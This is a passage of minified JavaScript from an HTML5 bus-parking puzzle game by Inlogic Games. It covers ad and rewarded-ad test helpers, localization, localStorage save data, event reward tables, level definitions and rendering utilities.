setTimeout(()=>this._retryAfkAd(),5E3)}_resetAfkTimer(){clearTimeout(this.afkTimer);this.afkTimer=setTimeout(()=>this._retryAfkAd(),this.config.afkTimer)}_initAfkAd(){this.afkTimer=Date.now();this.boundResetAfkTimer=this._resetAfkTimer.bind(this);document.addEventListener("keydown",this.boundResetAfkTimer);document.addEventListener("mousedown",this.boundResetAfkTimer);document.addEventListener("touchstart",this.boundResetAfkTimer);this._resetAfkTimer()}}
const GAMEOVER_BY_WIN=1,GAMEOVER_BY_LOSE=0,GAMEOVER_BY_USER=-1;
class InlogicHelper{constructor(a){this.config=a;this.currentScore=this.currentLevel=0;this.setSoundVolume=this.setMusicVolume=this.isTutorialDone=this.setMute=this.setInput=this.unpauseGame=this.pauseGame=this.gameInit=null;this.test=!1}onGameOver(a){null==a&&alert("NO GAMEOVER TYPE SET !");inlogicLog("On Game Over",a)}getForcedLanguage(){return null}onGameStart(a){inlogicLog("Game Started. Restarted?"+a?"YES!":"NO!")}onSplashLoaded(){inlogicLog("Splash loaded!")}onGameLoaded(){inlogicLog("Game loaded!")}onEnteredGame(){inlogicLog("On entered game")}setMute(a){a?this.unMuteGame():
this.muteGame()}setPaused(a){a?this.pauseGame():this.unpauseGame()}functionsTest(){const a="pauseGame unpauseGame setMute setInput gameInit isTutorialDone".split(" ");for(const b of a)null!==this[b]&&"function"===typeof this[b]||console.error(`NO ${b.toUpperCase()} FUNCTION DEFINED`)}setScore(a){this.currentScore=a}setLevel(a){this.currentLevel=a}setTitleName(a){document.title=a}}
class InlRewardAds{constructor(a){this.active=a.active;(this.test=a.test)&&showToast("TEST REW ADS ALLOWED")}showRewardedAd(a,b,e){this.test&&(console.warn("TEST ADS ALLOWED !"),this.showFakeRewAd(a,b,e))}}inlModule.ads=new AdHelper(adsConfig);inlModule.rewardAds=new InlRewardAds(rewAdsConfig);inlModule.game=new InlogicHelper(gameConfig);function inlogicLog(...a){}function inlogicError(...a){console.error(...a)}inlogicLog("Module initialized! v"+inlModule.VERSION);
function showToast(a,b=3E3){let e=document.createElement("div");e.textContent=a;e.style.position="fixed";e.style.left="50%";e.style.transform="translateX(-50%)";e.style.backgroundColor="rgba(0, 0, 0, 0.8)";e.style.color="white";e.style.padding="10px 20px";e.style.borderRadius="5px";e.style.fontSize="20px";e.style.boxShadow="0px 4px 6px rgba(0, 0, 0, 0.3)";e.style.zIndex="1000";e.style.opacity="0";e.style.transition="opacity 0.5s ease-in-out, bottom 0.5s ease-in-out";a=20+50*document.querySelectorAll(".toast-message").length;
e.style.bottom=`${a}px`;e.classList.add("toast-message");document.body.appendChild(e);setTimeout(()=>{e.style.opacity="1"},10);setTimeout(()=>{e.style.opacity="0";setTimeout(()=>{document.body.removeChild(e)},500)},b)}
inlModule.ads.showFakeAd=function(a='"This is a test inlogic ad. Closing in 3 seconds..."'){const b=document.createElement("div");b.id="fakeAd";b.style.position="fixed";b.style.top="5%";b.style.left="5%";b.style.width="90%";b.style.height="90%";b.style.backgroundColor="#f0f0f0";b.style.border="1px solid #ccc";b.style.outline="15px solid black";b.style.boxShadow="0 0 10px rgba(0, 0, 0, 0.1)";b.style.display="flex";b.style.flexDirection="column";b.style.justifyContent="center";b.style.alignItems="center";
b.style.fontFamily="Arial, sans-serif";b.style.zIndex="1000";const e=document.createElement("div");e.textContent="INLOGIC FAKE AD";e.style.position="absolute";e.style.top="10px";e.style.fontSize="24px";e.style.fontWeight="bold";e.style.color="#000";const f=document.createElement("p");f.textContent=a;f.style.fontSize="24px";f.style.color="#333";b.appendChild(e);b.appendChild(f);document.body.appendChild(b);setTimeout(()=>{document.body.removeChild(b)},3E3)};
inlModule.rewardAds.showFakeRewAd=function(a,b,e){const f=document.createElement("div");f.id="fakeRewardedAd";f.style.position="fixed";f.style.top="5%";f.style.left="5%";f.style.width="90%";f.style.height="90%";f.style.backgroundColor="#f0f0f0";f.style.border="1px solid #ccc";f.style.outline="15px solid black";f.style.boxShadow="0 0 10px rgba(0, 0, 0, 0.1)";f.style.display="flex";f.style.flexDirection="column";f.style.justifyContent="center";f.style.alignItems="center";f.style.fontFamily="Arial, sans-serif";
f.style.zIndex="1000";const h=document.createElement("div");h.textContent="INLOGIC REWARDED AD";h.style.position="absolute";h.style.top="10px";h.style.fontSize="24px";h.style.fontWeight="bold";h.style.color="#000";const m=document.createElement("p");m.textContent="Watch this ad to earn a reward!";m.style.fontSize="24px";m.style.color="#333";const k=document.createElement("div");k.style.display="flex";k.style.gap="20px";k.style.marginTop="20px";const n=document.createElement("button");n.textContent=
"SUCCESSFUL";n.style.backgroundColor="#4CAF50";n.style.color="#fff";n.style.border="none";n.style.padding="10px 20px";n.style.fontSize="18px";n.style.cursor="pointer";n.style.borderRadius="5px";const v=document.createElement("button");v.textContent="FAILED";v.style.backgroundColor="#f44336";v.style.color="#fff";v.style.border="none";v.style.padding="10px 20px";v.style.fontSize="18px";v.style.cursor="pointer";v.style.borderRadius="5px";k.appendChild(n);k.appendChild(v);f.appendChild(h);f.appendChild(m);
f.appendChild(k);document.body.appendChild(f);n.addEventListener("click",()=>{"function"===typeof a&&a.call(e);document.body.removeChild(f)});v.addEventListener("click",()=>{"function"===typeof b&&b.call(e);document.body.removeChild(f)})};var ANTIALIAS_ENABLED=!0,soundManager=null,screenSplash=null,screenTopPanel=null,screenGame=null,screenBackground=null,screenSettings=null,screenParticles=null,progressMap={},onProgress=function(a,b){progressMap[a]=+b;Object.keys(progressMap).reduce(function(e,f){return e+progressMap[f]},0);null!=screenSplash&&(screenSplash.txtContinue.text=b+"%")},runGame=function(){Buttons.enabled=!1;engine=new BABYLON.Engine(canvas,ANTIALIAS_ENABLED,{},!0);engine.disableUniformBuffers=!0;var a=new customLoadingScreen;
engine.loadingScreen=a;engine.displayLoadingUI();activeScene=new SceneMain(engine);VisibilityHandler(activeScene);onResize=function(b){engine.setHardwareScalingLevel(1);engine.resize();var e=engine.getRenderWidth(),f=engine.getRenderHeight();GLOBAL_SCALE_LEVEL=f/Resolution.HEIGHT;Resolution.CORRECTION_MUL=1;f>e&&(GLOBAL_SCALE_LEVEL=e/Resolution.WIDTH);engine.setHardwareScalingLevel(GLOBAL_SCALE_LEVEL);engine.resize();engineRenderWidth=engine.getRenderWidth();engineRenderHeight=engine.getRenderHeight();
2500<engineRenderWidth&&(engine.setHardwareScalingLevel(1),engine.resize(),GLOBAL_SCALE_LEVEL=e/2500,engine.setHardwareScalingLevel(GLOBAL_SCALE_LEVEL),engine.resize(),engineRenderWidth=engine.getRenderWidth(),engineRenderHeight=engine.getRenderHeight());activeScene.onResize(b)};onResize();activeScene.scene.blockMaterialDirtyMechanism=!0;assetLoader=new AssetLoader(activeScene.scene);assetLoader.loadFonts(function(){onResize()});loadLanguages=function(){languages=new Languages(assetLoader.loadedXMLs["m.isr"]);
languages.language="en";var b=navigator.userLanguage||navigator.language;0==b.indexOf("fr")&&(Languages.instance.language="fr");0==b.indexOf("it")&&(Languages.instance.language="it");0==b.indexOf("de")&&(Languages.instance.language="de");0==b.indexOf("es")&&(Languages.instance.language="es");0==b.indexOf("pt")&&(Languages.instance.language="pt");0==b.indexOf("br")&&(Languages.instance.language="pt");0==b.indexOf("ru")&&(Languages.instance.language="ru");b=getUrlParameterByName("lang");null!==b&&("en"==
b&&(Languages.instance.language="en"),"de"==b&&(Languages.instance.language="de"),"es"==b&&(Languages.instance.language="es"),"fr"==b&&(Languages.instance.language="fr"),"it"==b&&(Languages.instance.language="it"),"br"==b&&(Languages.instance.language="pt"),"pt"==b&&(Languages.instance.language="pt"),"ru"==b&&(Languages.instance.language="ru"))};assetLoader.loadSplashAssets(function(){adinplay_init();loadLanguages();activeScene.scene.blockMaterialDirtyMechanism=!1;activeScene.audioType="mp3";GameData.Load();
screenSplash=new ScreenSplash(activeScene.scene);activeScene.addScreen(screenSplash);activeScene.scene.activeCameras=[screenSplash.camera];activeScene.scene.activeCamera=screenSplash.camera;activeScene.scene.cameraToUseForPointers=screenSplash.camera;setGameResolutionByQuality();onResize();onResize();engine.runRenderLoop(function(){activeScene.beforeRender();activeScene.render();activeScene.afterRender()});window.addEventListener("resize",onResize);window.addEventListener("contextmenu",function(b){b.preventDefault()});
document.documentElement.style.overflow="hidden";document.body.scroll="no"})};
function loadGameAssets(){assetLoader.loadGameAssets(function(){soundManager=new SoundManager(activeScene);screenBackground=new ScreenBackground(activeScene.scene);screenGame=new ScreenGame(activeScene.scene);screenHand=new ScreenHand(activeScene.scene);screenPurchaseBooster=new ScreenPurchaseBooster(activeScene.scene);screenPurchaseSpot=new ScreenPurchaseSpot(activeScene.scene);screenLevelCompleted=new ScreenLevelCompleted(activeScene.scene);screenLevelCompletedADs=new ScreenLevelCompletedADs(activeScene.scene);
screenLevelFailed=new ScreenLevelFailed(activeScene.scene);screenContinue=new ScreenContinue(activeScene.scene);screenTopPanel=new ScreenTopPanel(activeScene.scene);screenParticles=new ScreenParticles(activeScene.scene);screenSettings=new ScreenSettings(activeScene.scene);activeScene.addScreen(screenBackground);activeScene.addScreen(screenGame);activeScene.addScreen(screenHand);activeScene.addScreen(screenPurchaseBooster);activeScene.addScreen(screenPurchaseSpot);activeScene.addScreen(screenLevelCompleted);
activeScene.addScreen(screenLevelCompletedADs);activeScene.addScreen(screenLevelFailed);activeScene.addScreen(screenContinue);activeScene.addScreen(screenTopPanel);activeScene.addScreen(screenParticles);activeScene.addScreen(screenSettings);activeScene.updateTexts();activeScene.scene.activeCameras=[screenBackground.camera,screenGame.cameraPlayer];activeScene.scene.activeCamera=screenGame.cameraPlayer;activeScene.scene.cameraToUseForPointers=screenGame.cameraPlayer;onResize();onResize();screenSplash.allAssetsLoaded()})}
function IEdetection(){var a=window.navigator.userAgent;return 0<a.indexOf("MSIE ")||0<a.indexOf("Trident/")||0<a.indexOf("Edg/")?!0:!1}function babylonInit(){mobileDetect=new MobileDetect(window.navigator.userAgent);runningOnMobile=null!=mobileDetect.mobile();(runningOnIPHONE=mobileDetect.is("iPhone"))&&17.4<=mobileDetect.version("iOS")&&(TEXT_SHADOWS_ENABLED=!1);canvas=document.getElementById("renderCanvas");runGame()}window.addEventListener("DOMContentLoaded",function(){babylonInit()});
function onStartGame(){console.warn("start game")}function onGameOver(a,b){};var POPUP_TRANSITION_DURATION=400,SCENE_TRANSITION_DURATION=250;RewardAds={showRewAd:function(a,b,e,f){if(typeof e==="function"){try{e()}catch(_){}}}};var Languages=function(a){if(null!=Languages.instance)return Languages.instance;Languages.instance=this;Languages.instance.language="en";this.gameTextsParsed=null;this.xml=a;this.gameTextsLists=[];a=this.xml.getElementsByTagName("string");for(var b=0;b<a.length;b++){null==this.gameTextsLists[a.item(b).getAttribute("id")]&&(this.gameTextsLists[a.item(b).getAttribute("id")]=[]);for(var e=0;e<LANGUAGES.length;e++)0<a.item(b).getElementsByTagName(LANGUAGES[e]).length&&(this.gameTextsLists[a.item(b).getAttribute("id")][LANGUAGES[e]]=
a.item(b).getElementsByTagName(LANGUAGES[e])[0].textContent.replace(/\\n/g,"\n"))}},LANGUAGES="en de es fr it pt ru".split(" "),LANGUAGE_NAMES=[];LANGUAGE_NAMES.en="ENGLISH";LANGUAGE_NAMES.de="DEUTSCH";LANGUAGE_NAMES.es="ESPA\u00d1OL";LANGUAGE_NAMES.fr="FRAN\u00c7AIS";LANGUAGE_NAMES.it="ITALIANO";LANGUAGE_NAMES.pt="PORTUGU\u00caS";LANGUAGE_NAMES.ru="\u0420\u0423\u0421\u0421\u041a\u0418\u0419";Languages.instance=null;Languages.prototype={};
function Str(a){return void 0==Languages.instance.gameTextsLists[a]||void 0==Languages.instance.gameTextsLists[a][Languages.instance.language]?(console.warn("STR("+a+") MISSING!"),"NAN"):Languages.instance.gameTextsLists[a][Languages.instance.language].replaceAll("\\n","\n")}function STR(a){return Str(a).toUpperCase()}
function EXPORT_LANGS(){for(textId in Languages.instance.gameTextsLists){for(var a=textId,b=0;b<LANGUAGES.length;b++)a=a+";"+Languages.instance.gameTextsLists[textId][LANGUAGES[b]];LOG(a)}}function UpdateDocumentTitle(){var a=GameData.BuildTitle;"ru"==Languages.instance.language&&(a=GameData.BuildTitleRU);document.title=a};var runningOnMobile=!1,runningOnIPHONE=!1,Resolution={PLANED_HEIGHT:800,HEIGHT:500,WIDTH:500,CORRECTION_MUL:1,get SCALE(){return Resolution.WIDTH/Resolution.PLANED_HEIGHT*Resolution.CORRECTION_MUL},getResolutionSize:function(){var a=engine.getRenderWidth(),b=engine.getRenderHeight();return a>b?b:a}};
function setGameResolutionByQuality(){runningOnMobile?(0==GameQuality&&(Resolution.HEIGHT=Resolution.WIDTH=520),1==GameQuality&&(Resolution.HEIGHT=Resolution.WIDTH=420)):(0==GameQuality&&(Resolution.HEIGHT=Resolution.WIDTH=950),1==GameQuality&&(Resolution.HEIGHT=Resolution.WIDTH=650))};var partnerName="localweb";window.partnerName=partnerName;var GameData=function(){};GameData.BuildTitle="Bus Parking Out";GameData.BuildTitleRU="\u0410\u0432\u0442\u043e\u0431\u0443\u0441\u043d\u0430\u044f \u0421\u0442\u043e\u044f\u043d\u043a\u0430";GameData.BuildVersion="1.0.0";GameData.BuildString="25.04.2025 14:53";GameData.BuildDebug=!1;GameData.Copyright="Inlogic Games 2025";GameData.ProfileName="inl-busout-3d";
console.info("%c %c   "+GameData.Copyright+" | "+GameData.BuildTitle+" v"+GameData.BuildVersion+" | "+GameData.BuildString+"  %c ","background:#353AFB","background:#000080;color:#fff","background:#353AFB");var DataVersion=.251,PlayerCash=0,ActiveLevel=0,SavedGame=null,SavedSoundVolume=0,SavedMusicVolume=0,GameQuality=0,OnboardingStep=0;const ONBOARDING_FINISHED=100;
GameData.Reset=function(){SelectedLanguage=null;ActiveLevel=PlayerCash=0;SavedGame=null;OnboardingStep=GameQuality=SavedMusicVolume=SavedSoundVolume=0};
GameData.Load=function(){GameData.Reset();var a=getUrlParameterByName("reset");null!=a&&"true"===a.toLowerCase()&&GameData.Save();a=null;try{a=JSON.parse(localStorage.getItem(GameData.ProfileName))}catch(b){}try{a.DataVersion!=DataVersion?GameData.Save():(SelectedLanguage=a.SelectedLanguage,PlayerCash=a.PlayerCash,ActiveLevel=a.ActiveLevel,SavedGame=a.SavedGame,SavedSoundVolume=a.SavedSoundVolume,SavedMusicVolume=a.SavedMusicVolume,GameQuality=a.GameQuality,OnboardingStep=a.OnboardingStep)}catch(b){GameData.Reset()}null!=
SelectedLanguage&&(Languages.instance.language=SelectedLanguage,activeScene.updateTexts());OverrideLangFromURL();UpdateDocumentTitle();OnboardingStep=1E3};GameData.Save=function(){var a={};a.DataVersion=DataVersion;a.SelectedLanguage=SelectedLanguage;a.PlayerCash=PlayerCash;a.ActiveLevel=ActiveLevel;a.SavedGame=SavedGame;a.SavedSoundVolume=SavedSoundVolume;a.SavedMusicVolume=SavedMusicVolume;a.GameQuality=GameQuality;a.OnboardingStep=OnboardingStep;try{localStorage.setItem(GameData.ProfileName,JSON.stringify(a))}catch(b){}};
function getLevelStars(a){return LevelStars.length<a+1||null==LevelStars[a]?-1:LevelStars[a]}function setLevelStars(a,b){getLevelStars(a)>b||(LevelStars[a]=b,GameData.Save())}function GetActiveSpecialEvent(){if(null!=TimeToSpecialEvent)return null;var a=SpecialEventTime-GlobalDate.getTime();if(0<Math.floor(a/1E3))return SpecialEventColor}
function OverrideLangFromURL(){var a=getUrlParameterByName("lang");null!==a&&("en"==a&&(Languages.instance.language="en"),"de"==a&&(Languages.instance.language="de"),"es"==a&&(Languages.instance.language="es"),"fr"==a&&(Languages.instance.language="fr"),"it"==a&&(Languages.instance.language="it"),"br"==a&&(Languages.instance.language="pt"),"pt"==a&&(Languages.instance.language="pt"),"ru"==a&&(Languages.instance.language="ru"),activeScene.updateTexts())}
var PLAYER_NAMES="Sp1nOrTeX;RaCkeTiFT;P0nG;sm4shS0nIc;LooPyNyx;fliCkUry;Tw1RlEch;r1coCheTaVe;SwiFtTriKe;PaDdleRowL;BliTzlAdE;VorTeXoLt;RaLLyUsh;SLiceT0rm;quAntuMuaKe;ApeXcE;NebuLaEt;TuRboWisT;Sw1ftP1n;PaDdlePh4nt0m;Fl4ShFlick;orb1tM3ga;str1keSphEre;z3PhyrZo0m;gl1deGuArdiAn;J4xZer;KiPpy5;z3dMan;VoXen8;TaZzo4;n3oKid;RyE5ky;BluEz1;CyBroX;luXar7;AsH3rX;KaiZen;SkYler;RoZin8;Z1vTop;MylOpe;jeTtix;Ri0Zen;z4neXy;cleOpa;fiNnix;ReXar5;V3xTor;LeOmax;IvYlux;BltRun;SwfKik22;IrnSwg;AerJmp;trbStr;DshDv;PwrPch366;RpdRow;FlcFly;thnThr;Questeer2;Sky Rush;pixel11;myth Riser;Twister;Frostbiter_4;Novablazer;echo;Terraorm;Aqua;overlord2;Lightning-,4;Thunderbolt".split(";"),PLAYER_NAMES_RU=
"\u0421\u0435\u0440\u0434\u0446\u0435\u0411\u0443\u0440\u043866 \u0422\u0430\u0439\u043d\u043e\u0421\u0432\u04352 m\u043e\u043b\u043d\u0438\u044f \u0412\u0438\u0445\u0440\u044c265 \u0416\u0435\u043b\u0435\u0437\u043d\u044b\u0439 \u0423\u0440\u0430\u0433\u0430\u043d \u0421\u043e\u043a\u043e\u043b5 \u0411\u044b\u0441\u0442\u0440\u044b\u0439 t\u0438\u0433\u0440 \u0420\u0430\u043a\u0435\u0442\u0430 \u0421\u043d\u0430\u0439\u043f\u0435\u0440789 \u0413\u0440\u0430\u043d\u0438\u0442 \u0421\u0438\u043b\u0430\u04474 \u0426\u0443\u043d\u0430\u043c\u04388 \u041a\u0440\u0438\u0441\u0442\u0430\u043b\u043b\u041c\u0435\u0447 \u041d\u043e\u0447\u043d\u043e\u0439\u0421\u0442\u0440\u0430\u0436 \u0420\u0430\u0441\u0441\u0432\u0435\u0442\u043d\u044b\u0439\u0412\u043e\u0438\u043d".split(" ");
function generateOpponentName(a){void 0===a&&(a=0);var b="PLAYER_"+getRandomUInt(1E3);800>getRandomUInt(1E3)&&(b="ru"==Languages.instance.language?PLAYER_NAMES_RU[a]:PLAYER_NAMES[a]);return b};var EventsColors=["green","red","blue"];function GetNextEventColor(a){a=EventsColors.indexOf(a);a++;a>=EventsColors.length&&(a=0);return EventsColors[a]}var Events=[];Events.green=[];Events.green.push({goal:1,prize:25});Events.green.push({goal:2,prize:50});Events.green.push({goal:3,prize:25});Events.green.push({goal:4,prize:50});Events.green.push({goal:10,prize:"double_event_currency"});Events.green.push({goal:3,prize:25});Events.green.push({goal:3,prize:50});Events.green.push({goal:3,prize:25});
Events.green.push({goal:3,prize:50});Events.green.push({goal:6,prize:100});Events.green.push({goal:6,prize:25});Events.green.push({goal:6,prize:50});Events.green.push({goal:6,prize:25});Events.green.push({goal:6,prize:50});Events.green.push({goal:12,prize:"double_event_currency"});Events.green.push({goal:9,prize:25});Events.green.push({goal:9,prize:50});Events.green.push({goal:9,prize:25});Events.green.push({goal:9,prize:50});Events.green.push({goal:18,prize:100});Events.green.push({goal:12,prize:25});
Events.green.push({goal:12,prize:50});Events.green.push({goal:12,prize:25});Events.green.push({goal:12,prize:50});Events.green.push({goal:24,prize:"double_event_currency"});Events.green.push({goal:15,prize:25});Events.green.push({goal:15,prize:50});Events.green.push({goal:15,prize:25});Events.green.push({goal:15,prize:50});Events.green.push({goal:30,prize:100});Events.red=[];Events.red.push({goal:1,prize:25});Events.red.push({goal:2,prize:"throwback"});Events.red.push({goal:3,prize:25});
Events.red.push({goal:4,prize:"mglass"});Events.red.push({goal:10,prize:"double_event_currency"});Events.red.push({goal:3,prize:25});Events.red.push({goal:3,prize:"throwback"});Events.red.push({goal:3,prize:25});Events.red.push({goal:3,prize:"mglass"});Events.red.push({goal:6,prize:"double_soft_currency"});Events.red.push({goal:6,prize:25});Events.red.push({goal:6,prize:"throwback"});Events.red.push({goal:6,prize:25});Events.red.push({goal:6,prize:"mglass"});Events.red.push({goal:12,prize:"double_event_currency"});
Events.red.push({goal:9,prize:25});Events.red.push({goal:9,prize:"throwback"});Events.red.push({goal:9,prize:25});Events.red.push({goal:9,prize:"mglass"});Events.red.push({goal:18,prize:"double_soft_currency"});Events.red.push({goal:12,prize:25});Events.red.push({goal:12,prize:"throwback"});Events.red.push({goal:12,prize:25});Events.red.push({goal:12,prize:"mglass"});Events.red.push({goal:24,prize:"double_event_currency"});Events.red.push({goal:15,prize:25});Events.red.push({goal:15,prize:"throwback"});
Events.red.push({goal:15,prize:25});Events.red.push({goal:15,prize:"mglass"});Events.red.push({goal:30,prize:"double_soft_currency"});Events.blue=[];Events.blue.push({goal:1,prize:25});Events.blue.push({goal:2,prize:"rocket"});Events.blue.push({goal:3,prize:25});Events.blue.push({goal:4,prize:"whirlwind"});Events.blue.push({goal:10,prize:"double_event_currency"});Events.blue.push({goal:3,prize:25});Events.blue.push({goal:3,prize:"rocket"});Events.blue.push({goal:3,prize:25});
Events.blue.push({goal:3,prize:"whirlwind"});Events.blue.push({goal:6,prize:"double_soft_currency"});Events.blue.push({goal:6,prize:25});Events.blue.push({goal:6,prize:"rocket"});Events.blue.push({goal:6,prize:25});Events.blue.push({goal:6,prize:"mglass"});Events.blue.push({goal:12,prize:"double_event_currency"});Events.blue.push({goal:9,prize:25});Events.blue.push({goal:9,prize:"rocket"});Events.blue.push({goal:9,prize:25});Events.blue.push({goal:9,prize:"whirlwind"});Events.blue.push({goal:18,prize:"double_soft_currency"});
Events.blue.push({goal:12,prize:25});Events.blue.push({goal:12,prize:"rocket"});Events.blue.push({goal:12,prize:25});Events.blue.push({goal:12,prize:"whirlwind"});Events.blue.push({goal:24,prize:"double_event_currency"});Events.blue.push({goal:15,prize:25});Events.blue.push({goal:15,prize:"rocket"});Events.blue.push({goal:15,prize:25});Events.blue.push({goal:15,prize:"whirlwind"});Events.blue.push({goal:30,prize:"double_soft_currency"});var REWARD_LEVEL1_COMPLETED=500,REWARD_LEVEL2_COMPLETED=250,REWARD_LEVEL_COMPLETED=50,REWARD_SMALL_CAR=1,REWARD_MEDIUM_CAR=2,REWARD_BIG_CAR=3,PRICE_BOOSTER_SORT=100,PRICE_BOOSTER_SHUFFLE=100,PRICE_BOOSTER_TURBO=140,PRICE_NEW_SPOT=140;inlModule.rewardAds.active&&(PRICE_BOOSTER_SHUFFLE=PRICE_BOOSTER_SORT=500,PRICE_BOOSTER_TURBO=700);var BoosterPrices=[];BoosterPrices.sort=PRICE_BOOSTER_SORT;BoosterPrices.shuffle=PRICE_BOOSTER_SHUFFLE;BoosterPrices.turbo=PRICE_BOOSTER_TURBO;
function getLevelReward(a){return 0==ActiveLevel?300:1==ActiveLevel?150:50};var Levels=[{gridSize:4,levelSeed:0,onboarding:!0,buses:[{id:0,position:[1,1],size:3,direction:"left",color:"blue"},{id:1,position:[0,2],size:2,direction:"up",color:"red"},{id:2,position:[4,1],size:3,direction:"up",color:"purple"},{id:3,position:[1,3],size:2,direction:"left",color:"orange"}]},{gridSize:6,levelSeed:7327849,colors:["blue","red","yellow"]},{gridSize:8,levelSeed:1567504,colors:["purple","pink","teal","yellow"]},{gridSize:10,levelSeed:13808656,colors:["red","pink","teal","yellow","green"]},
{gridSize:12,levelSeed:674041,colors:"red pink teal yellow green blue".split(" ")}];function getRandomUInt(a){return Math.floor(Math.random()*a)}function getRandomUIntWithSeed(a,b){return Math.floor(randomWithSeed(b)*a)}function getRandomInt(a){return Math.floor(Math.random()*a)*(50<getRandomUInt(10)?-1:1)}function getRandomIntWithSeed(a,b){return getRandomUIntWithSeed(a,b)*(50<getRandomUIntWithSeed(100,Math.pow(b,2))?-1:1)}function getRandomUIntInRange(a,b){return Math.floor(Math.random()*(b-a+1))+a}
function getRandomUIntInRangeWithSeed(a,b,e){return Math.floor(randomWithSeed(e)*(b-a+1))+a}function getRandomIntInRange(a,b){if(!Number.isInteger(a)||!Number.isInteger(b)||b<=a)throw Error("Both min and max should be integers with max > min.");return getRandomInt(b-a)+a}function isNumber(a){return Number(a)===a}function lerp(a,b,e){return(1-e)*a+e*b}function RadToDeg(a){return 180/Math.PI*a}function DegToRad(a){return Math.PI/180*a}String.prototype.replaceAll=function(a,b){return this.split(a).join(b)};
Array.prototype.remove=function(a){return-1!=this.indexOf(a)?(this.splice(this.indexOf(a),1),!0):!1};function cloneObject(a){if(null==a||"object"!=typeof a)return a;var b=a.constructor(),e;for(e in a)a.hasOwnProperty(e)&&(b[e]=a[e]);return b}function isUpperCase(a){return a==a.toUpperCase()}function isLowerCase(a){return a==a.toLowerCase()}function shuffleArray(a){for(var b=a.length,e,f;0!==b;)f=Math.floor(Math.random()*b),--b,e=a[b],a[b]=a[f],a[f]=e;return a}
function shuffleArrayWithSeed(a,b){for(var e=a.length,f,h;e;)h=Math.floor(randomWithSeed(b)*e--),f=a[e],a[e]=a[h],a[h]=f,++b;return a}function randomWithSeed(a){a=1E4*Math.sin(a++);return a-Math.floor(a)}function findStringInArray(a,b){for(var e=0;e<b.length;e++)if(b[e].match(a))return e;return-1}function fetchFromObject(a,b){if("undefined"===typeof a)return!1;var e=b.indexOf(".");return-1<e?fetchFromObject(a[b.substring(0,e)],b.substr(e+1)):a[b]}
function SetImageFromSpritesheet(a,b,e,f){if(a.domImage==b&&a.frameName==f)return!0;e=GetFrameByName(e,f);if(null==e)return console.error("SetImageFromSpritesheet > frame not found ! [ "+f+" ]"),!1;a.domImage=b;a.sourceLeft=e.frame.x;a.sourceTop=e.frame.y;a.sourceWidth=e.frame.w;a.sourceHeight=e.frame.h;a.widthInPixels=e.frame.w;a.heightInPixels=e.frame.h;a.imageWidth=e.frame.w;a.imageHeight=e.frame.h;a.frameName=f;return!0}
function SetTextureFromSpritesheet(a,b,e){b=GetFrameByName(b,e);if(null==b)return console.error("SetTextureFromSpritesheet > frame not found ! [ "+e+" ]"),!1;e=a._texture.baseWidth;var f=a._texture.baseHeight;a.uOffset=b.frame.x/e;a.vOffset=1-b.frame.y/f;a.uScale=b.frame.w/e;a.vScale=-b.frame.h/f;return!0}
function createDialogImage(a,b,e,f,h,m,k,n,v,w){var r=new BABYLON.GUI.Image,y=getAssetImage(a);a=getAssetImageFrames(a);r.domImage=y;SetImageFromSpritesheet(r,y,a,b);r.widthInPixels=e;r.heightInPixels=f;r.sliceLeft=w;r.sliceTop=k;r.sliceBottom=m-v;r.sliceRight=h-n;r.stretch=BABYLON.GUI.Image.STRETCH_NINE_PATCH;return r}
function GetTextureFaceVectorFromSpritesheet(a,b,e){b=GetFrameByName(b,e);if(null==b)return console.error("GetTextureFaceVectorFromSpritesheet > frame not found ! [ "+e+" ]"),!1;e=a.width;a=a.height;return new BABYLON.Vector4(b.frame.x/e,1-(b.frame.y+b.frame.h)/a,(b.frame.x+b.frame.w)/e,1-b.frame.y/a)}
function autoResizeOrthographicCamera(a,b,e){Resolution.getResolutionSize();e=engine.getRenderHeight()/b;b=engine.getRenderWidth()/b;a.orthoBottom=-e;a.orthoTop=e;a.orthoLeft=-b;a.orthoRight=b;return{height:e,width:b}}function createDelayedFunction(a,b,e){e=new BABYLON.AdvancedTimer({contextObservable:activeScene.scene.onBeforeRenderObservable,userData:e});e.onTimerEndedObservable.add(b);e.start(a)}
function traverseFindChildNodeByName(a,b,e){void 0===e&&(e=null);if(a.name==b&&(null==e||e==a.getClassName()))return a;if(null!=a._children)for(var f=0;f<a._children.length;f++){var h=traverseFindChildNodeByName(a._children[f],b,e);if(null!=h)return h}return null}function getAllSumChildNodes(a,b,e){void 0===b&&(b=null);void 0===e&&(e=[]);null==b?e.push(a):b==a.getClassName()&&e.push(a);if(null!=a._children)for(var f=0;f<a._children.length;f++)getAllSumChildNodes(a._children[f],b,e);return e}
function getTextWidth(a,b,e,f){if(0<=b.indexOf("\n")){b=b.split("\n");for(var h=0,m=0;m<b.length;m++){var k=getTextWidth(a,b[m],e,f);h<k&&(h=k)}return h}a.font=f+"px "+e;return a.measureText(b).width}
function updateTextToWidth(a,b,e,f,h,m){void 0===h&&(h=Math.ceil(f/10));void 0===m&&(m=a.text);if(0<=m.indexOf("\n")){m=m.split("\n");for(var k=f,n=0;n<m.length;n++)updateTextToWidth(a,b,e,f,h,m[n]),k>a._fontSize._value&&(k=a._fontSize._value);a.fontSize=k+"px";return k}a.fontSize=f;b.font=f+"px "+a.fontFamily;for(k=b.measureText(m);k.width>e;)f-=h,b.font=f+"px "+a.fontFamily,k=b.measureText(m);return a.fontSize=f}
function updateTextToHeight(a,b,e,f,h,m){void 0===h&&(h=Math.ceil(f/10));void 0===m&&(m=a.text);var k=1;0<=m.indexOf("\n")&&(k=m.split("\n").length);a.fontSize=f;b.font=f+"px "+a.fontFamily;var n=b.measureText(m);for(n=(n.actualBoundingBoxAscent+n.actualBoundingBoxDescent)*k;n>e;)f-=h,b.font=f+"px "+a.fontFamily,n=b.measureText(m),n=(n.actualBoundingBoxAscent+n.actualBoundingBoxDescent)*k;a.fontSize=f}
function traverseSetAttrib(a,b,e){"Mesh"==a.getClassName()&&(a[b]=e);if(null!=a._children)for(var f=0;f<a._children.length;f++){var h=traverseSetAttrib(a._children[f],b,e);if(null!=h)return h}return null}function saveExternalFile(a,b){b=new Blob([b],{type:"text/plain;charset=utf-8"});saveAs(b,a)}function leadingZero(a,b){for(a=""+a;a.length<b;)a="0"+a;return a}
